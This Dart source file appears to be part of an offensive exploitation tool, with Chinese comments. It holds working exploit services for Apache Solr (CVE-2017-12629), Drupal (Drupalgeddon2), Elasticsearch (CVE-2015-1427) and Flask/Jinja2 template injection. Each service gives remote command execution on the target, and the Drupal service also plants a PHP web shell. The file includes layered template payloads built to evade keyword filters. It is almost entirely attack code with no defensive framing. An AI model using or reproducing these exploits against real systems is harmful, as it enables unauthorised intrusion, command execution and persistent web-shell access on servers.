import 'dart:convert';

import 'package:http/http.dart' as http;

import '../../../app/constants.dart';
import 'exp_result.dart';
import 'rce_encoder.dart';

class SolrExpService {
  final String baseUrl;
  final String coreName;
  final Duration timeout;

  SolrExpService({
    required this.baseUrl,
    this.coreName = 'demo',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base => baseUrl.endsWith('/')
      ? baseUrl.substring(0, baseUrl.length - 1)
      : baseUrl;

  Future<ExpResult> check() async {
    try {
      final listenerPayload = jsonEncode({
        'add-listener': {
          'event': 'postCommit',
          'name': 'matrix_check_54289',
          'class': 'solr.RunExecutableListener',
          'exe': 'sh',
          'dir': '/bin/',
          'args': ['-c', 'echo solr_check_54289'],
        },
      });
      final configRes = await http
          .post(
            Uri.parse('$_base/solr/$coreName/config'),
            headers: {'Content-Type': 'application/json'},
            body: listenerPayload,
          )
          .timeout(timeout);
      final updateRes = await http
          .post(
            Uri.parse('$_base/solr/$coreName/update'),
            headers: {'Content-Type': 'application/json'},
            body: '[{"id":"check_trigger_54289"}]',
          )
          .timeout(timeout);

      if ((configRes.statusCode == 200 || configRes.statusCode == 201) &&
          (updateRes.statusCode == 200 || updateRes.statusCode == 201)) {
        return ExpResult(
          true,
          'CVE-2017-12629',
          'config + update 触发链路可达，疑似可利用',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-12629', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      const listenerName = 'matrix_exploit';
      final listener = {
        'event': 'postCommit',
        'name': listenerName,
        'class': 'solr.RunExecutableListener',
        'exe': 'sh',
        'dir': '/bin/',
        'args': ['-c', RceEncoder.shellBase64Wrap(cmd)],
      };

      var configRes = await http
          .post(
            Uri.parse('$_base/solr/$coreName/config'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'add-listener': listener}),
          )
          .timeout(timeout);

      // Solr returns HTTP 200 even when add-listener fails because the name
      // already exists; detect this by inspecting the response body and
      // retry with update-listener.
      if (configRes.body.contains('already exists')) {
        configRes = await http
            .post(
              Uri.parse('$_base/solr/$coreName/config'),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode({'update-listener': listener}),
            )
            .timeout(timeout);
      }

      await http
          .post(
            Uri.parse('$_base/solr/$coreName/update'),
            headers: {'Content-Type': 'application/json'},
            body: '[{"id":"rce_trigger"}]',
          )
          .timeout(timeout);

      final commitRes = await http
          .get(Uri.parse('$_base/solr/$coreName/update?commit=true'))
          .timeout(timeout);
      return '命令已发送 (commit 状态: ${commitRes.statusCode})。注意：Solr RCE 无回显，请用 OOB 或写文件验证。';
    } catch (_) {
      return null;
    }
  }
}

class DrupalExpService {
  final String baseUrl;
  final Duration timeout;

  DrupalExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base => baseUrl.endsWith('/')
      ? baseUrl.substring(0, baseUrl.length - 1)
      : baseUrl;

  Future<String?> getShell(
    String shellContent, {
    String password = AppConstants.defaultShellPassword,
  }) async {
    try {
      const shellFile = 'php_behinder.php';
      final shellB64 = base64.encode(utf8.encode(shellContent));
      // 用 exec 运行 php -r 写文件，避免 assert 在目标环境里被禁用
      final phpCmd =
          "php -r 'file_put_contents(\"$shellFile\", base64_decode(\"$shellB64\"));'";
      final payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(phpCmd)}';
      await http
          .post(
            Uri.parse(
              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
            ),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      final checkUrl = '$_base/$shellFile';
      final check = await http.get(Uri.parse(checkUrl)).timeout(timeout);
      if (check.statusCode == 200) return '$checkUrl Pass:$password';
      return null;
    } catch (_) {
      return null;
    }
  }

  String _cleanHtml(String html) {
    final normalized = html
        .replaceAll(RegExp(r'<br\s*/?>', caseSensitive: false), '\n')
        .replaceAll(
          RegExp(r'</(?:div|p|li|tr|th|td|ul|ol)>', caseSensitive: false),
          '\n',
        )
        .replaceAll(RegExp(r'<[^>]*>'), '')
        .replaceAll(RegExp(r'\r\n?'), '\n')
        .replaceAll(RegExp(r'\n+'), '\n');
    return normalized;
  }

  String? _parseOutput(String body) {
    try {
      final list = jsonDecode(body) as List<dynamic>;
      final outputs = <String>[];
      for (final item in list) {
        if (item is Map && item['command'] == 'insert') {
          outputs.add(item['data'] as String? ?? '');
        }
      }
      if (outputs.isNotEmpty) {
        return _cleanHtml(outputs.join('\n')).trim();
      }
    } catch (_) {}
    if (body.isEmpty) return null;
    final cleaned = _cleanHtml(body).trim();
    if (cleaned.isNotEmpty) return cleaned;
    return null;
  }

  Future<ExpResult> check() async {
    try {
      const payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id';
      final res = await http
          .post(
            Uri.parse(
              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
            ),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      if (res.body.contains('uid=') ||
          (res.statusCode == 200 && res.body.contains('['))) {
        return ExpResult(
          true,
          'CVE-2018-7600 (Drupalgeddon2)',
          '端点响应，Form API #post_render 注入可能存在',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2018-7600 (Drupalgeddon2)', '');
  }

  String _buildSafeCommand(String cmd) {
    final trimmed = cmd.trim();
    // 强制输出 base64 单行，免受 Drupal AJAX 嵌入 HTML 换行影响
    if (trimmed.contains('base64')) {
      return trimmed;
    }
    return '$trimmed | base64 | tr -d "\\n"';
  }

  Future<String?> execRce(String cmd) async {
    try {
      final safeCmd = _buildSafeCommand(cmd);
      final payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(safeCmd)}';
      final res = await http
          .post(
            Uri.parse(
              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
            ),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      final out = _parseOutput(res.body);
      if (out == null || out.isEmpty) return null;
      // 先尝试把执行结果当 base64 解码，还原原始输出。失败则返回原串。
      try {
        final decoded = utf8.decode(base64.decode(out.trim()));
        return decoded;
      } catch (_) {
        return out;
      }
    } catch (_) {
      return null;
    }
  }
}

class ElasticsearchExpService {
  final String baseUrl;
  final Duration timeout;

  ElasticsearchExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base => baseUrl.endsWith('/')
      ? baseUrl.substring(0, baseUrl.length - 1)
      : baseUrl;

  Future<ExpResult> check() async {
    try {
      // 先创建临时文档确保有数据
      await http
          .post(
            Uri.parse('$_base/matrix_check/doc/1'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'check': 'data'}),
          )
          .timeout(timeout);

      final payload = jsonEncode({
        'size': 1,
        'script_fields': {
          'result': {
            'script': 'def cmd="echo 54289"; def res=cmd.execute().text; res',
          },
        },
      });
      final res = await http
          .post(
            Uri.parse('$_base/_search?pretty'),
            headers: {'Content-Type': 'application/json'},
            body: payload,
          )
          .timeout(timeout);
      if (res.body.contains('54289')) {
        return ExpResult(true, 'CVE-2015-1427', 'Groovy 沙箱逃逸，echo 54289 验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2015-1427', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      // 先创建临时文档确保有数据
      await http
          .post(
            Uri.parse('$_base/matrix_exec/doc/1'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'exec': 'data'}),
          )
          .timeout(timeout);

      final payload = jsonEncode({
        'size': 1,
        'script_fields': {
          'result': {
            'script': 'def cmd="$cmd"; def res=cmd.execute().text; res',
          },
        },
      });
      final res = await http
          .post(
            Uri.parse('$_base/_search?pretty'),
            headers: {'Content-Type': 'application/json'},
            body: payload,
          )
          .timeout(timeout);
      if (res.statusCode == 200) {
        try {
          final decoded = jsonDecode(res.body);
          final hits = decoded['hits']?['hits'] as List?;
          if (hits != null && hits.isNotEmpty) {
            return hits.first['fields']?['result']?.first?.toString() ??
                res.body;
          }
        } catch (_) {}
        return res.body;
      }
    } catch (_) {}
    return null;
  }
}

enum SstiInjectMode { get, post, header }

class FlaskSstiExpService {
  final String baseUrl;
  final String paramName;
  final SstiInjectMode injectMode;
  /// 额外请求头，每次请求都会带上
  final Map<String, String> extraHeaders;
  /// 原始请求体模板，{{INJECT}} 占位符会被替换为实际 payload
  final String rawBody;
  final Duration timeout;

  FlaskSstiExpService({
    required this.baseUrl,
    this.paramName = 'name',
    this.injectMode = SstiInjectMode.get,
    this.extraHeaders = const {},
    this.rawBody = '',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base => baseUrl.endsWith('/')
      ? baseUrl.substring(0, baseUrl.length - 1)
      : baseUrl;

  Future<http.Response> _send(String payload) {
    final baseUri = Uri.parse('$_base/');
    final headers = Map<String, String>.from(extraHeaders);

    switch (injectMode) {
      case SstiInjectMode.get:
        return http
            .get(
              Uri.parse('$_base/?$paramName=${Uri.encodeComponent(payload)}'),
              headers: headers,
            )
            .timeout(timeout);

      case SstiInjectMode.post:
        final body = rawBody.isNotEmpty
            ? rawBody.replaceAll('{{INJECT}}', payload)
            : '$paramName=${Uri.encodeComponent(payload)}';
        if (!headers.keys.any((k) => k.toLowerCase() == 'content-type')) {
          final trimmed = rawBody.trimLeft();
          headers['Content-Type'] =
              (trimmed.startsWith('{') || trimmed.startsWith('['))
                  ? 'application/json'
                  : 'application/x-www-form-urlencoded';
        }
        return http
            .post(baseUri, headers: headers, body: body)
            .timeout(timeout);

      case SstiInjectMode.header:
        // {{INJECT}} 占位符替换 header 值
        for (final key in headers.keys.toList()) {
          headers[key] = headers[key]!.replaceAll('{{INJECT}}', payload);
        }
        return http.get(baseUri, headers: headers).timeout(timeout);
    }
  }

  Future<ExpResult> check() async {
    try {
      final res = await _send('{{233*233}}');
      if (res.body.contains('54289')) {
        return ExpResult(
          true,
          'Flask/Jinja2 SSTI',
          'SSTI 存在，233×233=54289 验证通过',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'Flask/Jinja2 SSTI', '');
  }

  // 将字符串拆成 Jinja2 字符级拼接，绕过命令关键字过滤
  // 例: "id" → "'i'~'d'"
  static String _j2Split(String s) {
    return s.split('').map((c) {
      final e = c == "'" ? "\\'" : c == '\\' ? '\\\\' : c;
      return "'$e'";
    }).join('~');
  }

  static const _sentinel = 'SSTI_OUT';

  // 从响应中提取哨兵标记之间的内容
  static String? _extract(String body) {
    final start = body.indexOf('${_sentinel}_S');
    final end = body.indexOf('${_sentinel}_E');
    if (start == -1 || end == -1 || end <= start) return null;
    return body.substring(start + '${_sentinel}_S'.length, end).trim();
  }

  // 用哨兵标记包裹 RCE 表达式，精确提取命令输出，过滤模板噪声
  String _wrap(String expr) => '${_sentinel}_S{{$expr}}${_sentinel}_E';

  Future<String?> execRce(String cmd) async {
    final splitCmd = _j2Split(cmd);

    // 三层递进 payload，兼容不同强度的关键字过滤：
    // 1. 直接执行（无过滤）
    // 2. |attr()+字符串拼接绕过 __dunder__ 属性过滤
    // 3. 在 2 的基础上额外绕过 Popen/shell/communicate/decode/stdout 关键字，
    //    命令本身也做字符级拆分
    final payloads = [
      "{% for c in ''.__class__.__mro__[1].__subclasses__() %}"
          "{% if c.__name__ == 'Popen' %}"
          "${_wrap("c('$cmd',shell=True,stdout=-1).communicate()[0].decode()")}"
          "{% endif %}{% endfor %}",
      "{%set d='_'*2%}"
          "{%for c in ''|attr(d+'class'+d)|attr(d+'mro'+d)|last|attr(d+'subclasses'+d)()%}"
          "{%if c|attr(d+'name'+d)=='Popen'%}"
          "${_wrap("c('$cmd',shell=True,stdout=-1).communicate()[0].decode()")}"
          "{%endif%}{%endfor%}",
      "{%set d='_'*2%}"
          "{%for c in ''|attr(d+'class'+d)|attr(d+'mro'+d)|last|attr(d+'subclasses'+d)()%}"
          "{%if c|attr(d+'name'+d)==('Po'+'pen')%}"
          "${_wrap("c(['sh','-c',$splitCmd],-1,None,None,-1)|attr('commun'+'icate')()|first|attr('dec'+'ode')()")}"
          "{%endif%}{%endfor%}",
    ];

    for (final payload in payloads) {
      try {
        final res = await _send(payload);
        if (res.statusCode == 200) {
          final out = _extract(res.body);
          if (out != null) return out;
        }
      } catch (_) {}
    }
    return null;
  }
}
